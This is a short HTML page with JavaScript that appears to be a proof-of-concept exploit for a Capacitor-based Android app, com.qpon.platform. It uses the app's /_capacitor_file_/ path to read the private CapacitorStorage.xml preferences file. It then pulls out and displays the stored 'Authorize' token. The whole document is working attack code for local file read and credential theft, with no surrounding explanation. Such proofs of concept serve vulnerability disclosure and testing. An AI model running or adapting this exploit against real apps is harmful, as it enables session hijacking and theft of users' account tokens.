<html><body><pre id="o"></pre><script>
var o=document.getElementById("o");
o.textContent="Origin: "+window.origin+"\n";
o.textContent+="Location: "+window.location.href+"\n\n";

var xhr=new XMLHttpRequest();
xhr.open("GET","/_capacitor_file_/data/data/com.qpon.platform/shared_prefs/CapacitorStorage.xml",true);
xhr.onload=function(){
  o.textContent+="Status: "+xhr.status+"\n";
  o.textContent+=xhr.responseText+"\n";
  var m=xhr.responseText.match(/<string name="Authorize">([^<]+)<\/string>/);
  if(m)o.textContent+="\nTOKEN: "+m[1];
};
xhr.onerror=function(){o.textContent+="XHR Error\n"};
xhr.send();
</script></body></html>
